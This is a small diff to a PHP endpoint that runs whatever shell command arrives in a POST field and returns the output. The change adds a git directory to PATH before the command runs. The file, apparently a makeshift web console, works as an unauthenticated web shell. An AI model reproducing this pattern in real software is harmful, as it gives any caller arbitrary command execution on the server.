@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
-  echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec($_POST['command']))));
+  echo trim(preg_replace('/\s+/', ' ', nl2br(shell_exec('export PATH=$PATH:~/git-2.9.5 && '.$_POST['command']))));
   return;
 }
 ?>
